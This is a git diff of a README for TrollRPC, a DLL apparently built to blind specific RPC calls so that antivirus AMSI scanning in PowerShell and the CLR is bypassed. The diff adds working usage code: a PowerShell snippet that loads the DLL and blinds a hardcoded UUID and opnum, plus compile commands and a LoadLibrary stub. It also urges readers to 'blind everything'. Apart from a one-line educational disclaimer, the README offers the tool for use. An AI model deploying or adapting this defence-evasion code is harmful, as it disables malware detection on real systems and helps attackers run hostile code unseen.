@@ -1,22 +1,28 @@
 # TrollRPC
-![Image](https://github.com/user-attachments/assets/a9d84d41-4f5b-4d71-98b9-24fc42e0d9d8)
-https://github.com/andreisss/Ghosting-AMSI released a amsi bypass by breaking NdrClientCall3 which means every subsequent RPC call (eg. some name resolution uses RPC thats why web requests to github fail) breaks which kind of makes the technique obsolete. This particular dll will only break the specific RPC call to the AV scan engine, allowing all other RPC calls through. This means you can bypass amsi for both powershell/clr and then continue running commands that require RPC (everything lol). 
 
-Currently it blinds a specific RPC call to a specific AV engine ;)  For anything else you gotta tweak to your liking - depending on the architecture of the product, whether or not it makes rpc call to engine for verification.
+https://github.com/andreisss/Ghosting-AMSI released a amsi bypass by breaking NdrClientCall3 which means every subsequent RPC call (eg. some name resolution uses RPC thats why web requests to github fail) breaks which kind of makes the technique obsolete. This particular dll will only break the specific RPC call to the AV scan engine, allowing all other RPC calls through. This means you can bypass amsi for **both powershell/clr** and then continue running commands that require RPC (everything lol). 
 
-## Compilation instructions
+So what is TrollRPC? Its a library to blind RPC calls based on UUID and OPNUM
+![Image](https://github.com/user-attachments/assets/8b3becbd-74e5-4d60-8f52-db029bbd9aa7)
+
+## C#
 ```
-#Use Visual Studio Command Prompt
+[System.Reflection.Assembly]::LoadFile("C:\TrollRPC.dll") 
+$UUID = "c503f532-443a-4c69-8300-ccd1fbdb3839"             # The UUID you are targetting
+$Opnum = 0x5E                                              # The opnum you are targetting
+$Opnum_break = 0x1F4                                       # Modify the opnum to an invalid value                   
+[TrollRPC]::Blind($UUID, $Opnum, $Opnum_break)
+```
+
+## C++
+```
+#Use Visual Studio Command Prompt to compile first 
 ml64 /c /nologo /Fo AsmStub.obj AsmStub.asm
 cl /LD /O2 /MD /DNDEBUG /Zl /GS- /Gy /GF TrollRPC.cpp AsmStub.obj /link kernel32.lib user32.lib msvcrt.lib /OPT:REF /OPT:ICF /DEBUG:NONE /PDB:NONE
 
-Alternatively, you can use the compiled dll
-```
-## General Usage 
-Just load the DLL into your desired process
-
-## .powershell Usage (does not require admin)
-```
+Alternatively, you can use the compiled dll.
+C++ doesnt allow dynamic input of UUID and OPNUM, have to manually tweak the asmstub to put in the OPNUM you want and recompile (easiest way)
+Running on powershell -> Right now its hardcoded for a specific AV engine ;)
 Add-Type -MemberDefinition @"
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr LoadLibrary(string lpFileName);
@@ -29,7 +35,9 @@ Add-Type -MemberDefinition @"
 Should only be used for educational purposes!
 
 ## Upgrades
-You can try doing it in c# and making it dynamically take in specific arguments to blind chosen RPC calls (now its hardcoded).
+- Be creative, blind everything, not just amsi
+- opsec not taken into consideration, its just functional
+
 
 
 
